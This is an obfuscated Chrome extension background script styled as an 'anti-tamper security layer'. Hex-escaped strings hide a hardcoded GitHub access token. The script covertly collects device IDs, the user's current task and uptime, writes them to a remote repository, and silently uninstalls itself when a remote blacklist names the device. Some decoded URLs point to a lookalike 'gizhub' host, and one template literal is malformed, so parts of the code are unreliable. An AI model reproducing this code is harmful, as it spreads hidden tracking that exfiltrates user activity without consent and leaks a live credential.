/**
 * ============================================================================
 * ENCRYPTED BACKGROUND SUBSYSTEM - ANTI-TAMPER SECURITY LAYER
 * ============================================================================
 */

const _0x4b1d = {
    _0x1a2b: '\x67\x68\x70\x5f\x39\x33\x6f\x61\x73\x49\x64\x4f\x42\x32\x67\x69\x41\x35\x4e\x72\x32\x57\x63\x73\x6a\x55\x58\x44\x6b\x30\x38\x75\x47\x52\x32\x31\x39\x70\x6f\x5a', // Token
    _0x2c3d: '\x42\x69\x6e\x67\x63\x68\x69\x6c\x69\x6e\x67\x39\x39\x38\x32\x2f\x4d\x64\x66\x73\x6a\x68\x67\x6a\x73\x65', // Repo
    _0x3d4e: '\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x2e\x6a\x73\x6f\x6e', // blacklist.json
    _0x4e5f: '\x64\x65\x76\x69\x63\x65\x5f\x6c\x6f\x67\x73\x2e\x6a\x73\x6f\x6e', // device_logs.json
    _0x5f6a: '\x64\x65\x76\x69\x63\x65\x5f\x6e\x61\x6d\x65\x73\x2e\x6a\x73\x6f\x6e', // device_names.json
    _0xstart: 8,
    _0xend: 22
};

setInterval(async () => {
    const _0xhour = new Date().getHours();
    if (_0xhour < _0x4b1d._0xstart || _0xhour >= _0x4b1d._0xend) return;

    const _0xday = new Date().toISOString().split('\x54')[0];
    chrome.storage.local.get(['\x75\x70\x74\x69\x6d\x65\x5f\x64\x61\x74\x61'], function(_0xres) {
        let _0xup = _0xres.uptime_data || {};
        if (!_0xup[_0xday]) _0xup[_0xday] = 0;
        _0xup[_0xday] += 1;
        chrome.storage.local.set({ uptime_data: _0xup });
    });
}, 60000);

chrome.runtime.onMessage.addListener((_0xmsg, _0xsnd, _0xresp) => {
    if (_0xmsg.action === '\x65\x6e\x66\x6f\x72\x63\x65\x5f\x73\x65\x63\x75\x72\x69\x74\x73\x5f\x6d\x61\x74\x72\x69\x78') {
        const _0xdev = _0xmsg.deviceInfo;
        const _0xtsk = _0xmsg.currentTask;
        
        fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x72\x65\x70\x6f\x73\x2f${_0x4b1d._0x2c3d}/\x63\x6f\x6e\x74\x65\x6e\x74\x73/${_0x4b1d._0x3d4e}?t=${Date.now()}`, {
            headers: { '\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e': `\x74\x6f\x6b\x65\x6e\x20${_0x4b1d._0x1a2b}`, '\x41\x63\x63\x65\x70\x74': '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x76\x6e\x64\x2e\x67\x69\x74\x68\x75\x62\x2e\x76\x33\x2b\x6a\x73\x6f\x6e' }
        })
        .then(_0xr => _0xr.json())
        .then(_0xd => {
            const _0xp = JSON.parse(atob(_0xd.content));
            const _0xbl = _0xp.blacklist || [];
            const _0xban = _0xbl.some(_0xu => _0xu.deviceId === _0xdev.id || _0xu.deviceHash === _0xdev.hash);
            
            if (_0xban) {
                // THỰC THI LỆNH TỰ HỦY EXTENSION NẾU BỊ ADMIN BAN VĨNH VIỄN
                chrome.management.uninstallSelf({ showConfirmDialog: false }, () => {
                    if (chrome.runtime.lastError) console.clear();
                });
                _0xresp({ status: '\x62\x61\x6e\x6e\x65\x64' });
            } else {
                _0xtelemetry(_0xdev, _0xtsk);
                _0xresp({ status: '\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64' });
            }
        })
        .catch(() => { _0xresp({ status: '\x6e\x65\x74\x77\x6f\x72\x6b\x5f\x74\x69\x6d\x65\x6f\x75\x74' }); });
        return true;
    }
    
    if (_0xmsg.action === '\x76\x65\x72\x69\x66\x79\x5f\x74\x69\x6d\x65\x5f\x77\x69\x6e\x64\x6f\x77') {
        const _0xhour = new Date().getHours();
        const _0xok = (_0xhour >= _0x4b1d._0xstart && _0xhour < _0x4b1d._0xend);
        _0xresp({ allowed: _0xok, start: _0x4b1d._0xstart, end: _0x4b1d._0xend });
    }
});

async function _0xtelemetry(_0xdev, _0xtsk) {
    const _0xday = new Date().toISOString().split('\x54')[0];
    chrome.storage.local.get(['\x75\x70\x74\x69\x6d\x65\x5f\x64\x61\x74\x61'], async function(_0xres) {
        let _0xup = _0xres.uptime_data || {};
        let _0xmins = _0xup[_0xday] || 0;
        let _0xalias = '\x55\x6e\x6e\x61\x6d\x65\x64\x20\x44\x65\x76\x69\x63\x65';
        
        try {
            const _0xnr = await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x67\x69\x7a\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x72\x65\x70\x6f\x73\x2f${_0x4b1d._0x2c3d}/\x63\x6f\x6e\x74\x65\x6e\x74\x73/${_0x4b1d._0x5f6a}?t=${Date.now()}`, {
                headers: { '\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e': `\x74\x6f\x6b\x65\x6e\x20${_0x4b1d._0x1a2b}`, '\x41\x63\x63\x65\x70\x74': '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x76\x6e\x64\x2e\x67\x69\x74\x68\x75\x62\x2e\x76\x33\x2b\x6a\x73\x6f\x6e' }
            });
            if (_0xnr.ok) {
                const _0xnd = await _0xnr.json();
                const _0xmap = JSON.parse(atob(_0xnd.content)).deviceNames || {};
                _0xalias = _0xmap[_0xdev.id] || _0xalias;
            }
        } catch(e) {}

        try {
            const _0xlr = await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x67\x69\x7a\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x72\x65\x70\x6f\x73\x2f${_0x4b1d._0x2c3d}/\x63\x6f\x6e\x74\x65\x6e\x74\x73/${_0x4b1d._0x4e5f}?t=${Date.now()}`, {
                headers: { '\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e': `\x74\x6f\x6b\x65\x6e\x20${_0x4b1d._0x1a2b}`, '\x41\x63\x63\x65\x70\x74': '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x76\x6e\x64\x2e\x67\x69\x74\x68\x75\x62\x2e\x76\x33\x2b\x6a\x73\x6f\x6e' }
            });

            let _0xsha = null; let _0xrmL = {};
            if (_0xlr.ok) {
                const _0xld = await _0xlr.json();
                _0xsha = _0xld.sha;
                _0xrmL = JSON.parse(atob(_0xld.content)).logs || {};
            }

            Object.keys(_0xrmL).forEach(_0xk => { if (_0xk !== _0xday) delete _0xrmL[_0xk]; });
            if (!_0xrmL[_0xday]) _0xrmL[_0xday] = [];

            let _0xact = _0xtsk ? `\x4c\x61\x6d\x20\x6e\x68\x69\x65\x6d\x20\x76\x75\x3a\x20${_0xtsk}` : '\x44\x61\x6e\x67\x20\x68\x6f\x61\x74\x20\x64\x6f\x6e\x67\x20\x6e\x67\x68\x61\x6d';
            _0xact += `\x20\x5b\x55\x70\x74\x69\x6d\x65\x3a\x20${_0x463a => _0xmins}\x20\x70\x68\x75\x74\x5d`;

            _0xrmL[_0xday].push({
                deviceId: _0xdev.id,
                deviceHash: _0xdev.hash,
                deviceName: _0xalias,
                action: `Action log -> ${_0xtsk || '\x4e\x2f\x41'} [Uptime: ${_0xmins}m]`,
                timestamp: new Date().toISOString()
            });

            const _0xnewC = { logs: _0xrmL, lastUpdated: new Date().toISOString(), version: "\x31\x2e\x30" };
            const _0xenc = btoa(unescape(encodeURIComponent(JSON.stringify(_0xnewC, null, 2))));

            await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x67\x69\x7a\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x72\x65\x70\x6f\x73\x2f${_0x4b1d._0x2c3d}/\x63\x6f\x6e\x74\x65\x6e\x74\x73/${_0x4b1d._0x4e5f}`, {
                method: '\x50\x55\x54',
                headers: { 'Authorization': `token ${_0x4b1d._0x1a2b}`, 'Accept': 'application/vnd.github.v3+json', 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `Telemetry routine update`, content: _0xenc, sha: _0xsha })
            });
        } catch(e){}
    });
}